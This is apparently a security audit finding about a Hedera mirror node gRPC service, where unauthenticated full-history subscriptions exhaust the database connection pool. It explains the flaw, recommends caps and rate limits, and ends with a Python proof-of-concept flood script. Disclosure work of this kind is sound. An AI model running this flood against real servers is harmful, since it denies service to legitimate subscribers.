### Title
Unauthenticated Unbounded Subscription Flood Causes DB Connection Pool Exhaustion via Full-History Scans

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no per-client or global subscription count limit. Any unauthenticated caller can open arbitrarily many gRPC connections, each carrying up to `maxConcurrentCallsPerConnection` (default: 5) subscriptions with `startTime=0` and no limit, causing `PollingTopicMessageRetriever.retrieve()` to execute thousands of concurrent full-history database scans. This exhausts the DB connection pool and starves all legitimate financial-message subscribers.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) immediately calls `topicMessageRetriever.retrieve(filter, true)` on line 63 for every new subscription with no guard on total active subscriptions:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

The only "limit" in the gRPC layer is `NettyProperties.maxConcurrentCallsPerConnection = 5` (per-connection, not global). An attacker opens N connections → N×5 concurrent subscriptions.

`TopicMessageFilter` accepts `startTime=0` (epoch) because the `@Min(0)` constraint and `isValidStartTime()` only require `startTime <= DomainUtils.now()`, which epoch-0 satisfies. `limit=0` means `hasLimit()` returns `false` — no row cap.

`PollingTopicMessageRetriever.retrieve()` (lines 45–63) with `throttled=true` sets `numRepeats = Long.MAX_VALUE` and polls indefinitely until `isComplete()` returns true. `isComplete()` for throttled mode (line 124–125):

```java
return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
```

With millions of historical messages and no limit, every page is full → `isComplete()` never returns true → the retriever keeps polling, holding a DB connection per active poll cycle.

`Flux.fromStream(topicMessageRepository.findByFilter(newFilter))` (line 78) issues a synchronous JDBC/R2DBC query per poll. The `scheduler = Schedulers.boundedElastic()` (line 41) caps threads at `10 × CPU cores`, but thousands of queued tasks still compete for the fixed-size DB connection pool (typically 10–20 HikariCP connections). Pool exhaustion causes all subsequent queries — including those from legitimate subscribers — to block or time out.

The `subscriberCount` AtomicLong (line 48) is a **metrics gauge only** — it is never checked against any maximum.

**Why existing checks fail:**

| Check | Scope | Bypass |
|---|---|---|
| `maxConcurrentCallsPerConnection = 5` | Per TCP connection | Open more connections |
| `subscriberCount` | Metrics only, no cap enforced | Not a gate |
| `boundedElastic` scheduler | Limits threads, not queued tasks or DB connections | Tasks queue up to 100k default |
| `retrieverProperties.getTimeout()` | Terminates individual streams eventually | Attacker re-subscribes immediately; during timeout window DB pool is held |

### Impact Explanation

DB connection pool exhaustion causes all queries — historical retrieval, live message gap-fill (`missingMessages`), and `topicExists` entity lookups — to time out. All active legitimate subscribers receive no messages or are disconnected. For a financial messaging network where topic messages carry transaction confirmations, this is a complete denial of service to all consumers for the duration of the attack. Severity: **High**.

### Likelihood Explanation

The gRPC endpoint is network-accessible with no authentication requirement visible in the codebase. An attacker needs only a gRPC client library and the ability to open TCP connections. The attack is trivially scriptable: open 200 connections × 5 streams each = 1,000 concurrent full-history scans. It is repeatable and requires no special knowledge beyond the topic ID (which is public on-chain data). Likelihood: **High**.

### Recommendation

1. **Enforce a global concurrent-subscription cap**: Check `subscriberCount` against a configurable maximum in `subscribeTopic()` before proceeding; return `RESOURCE_EXHAUSTED` gRPC status if exceeded.
2. **Enforce a per-IP/per-client subscription cap**: Track subscriptions by remote peer address and reject excess requests.
3. **Require a minimum `startTime`**: Reject or clamp `startTime` values older than a configurable horizon (e.g., 24 hours) to prevent full-history scans.
4. **Require a non-zero `limit`** for historical-range queries, or cap the maximum rows returnable per subscription.
5. **Add rate limiting** at the gRPC interceptor layer on subscription creation frequency per client.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = <any valid topic id>
NUM_CONNECTIONS = 200
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=TOPIC_ID,
            consensusStartTime=0,   # epoch — full history scan
            # no limit, no end time
        )
        stream = stub.subscribeTopic(req)
        streams.append(stream)
    # Hold streams open indefinitely
    for s in streams:
        for _ in s:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# Result: 1,000 concurrent full-history DB scans → pool exhaustion
# Legitimate subscribers begin timing out within seconds
```
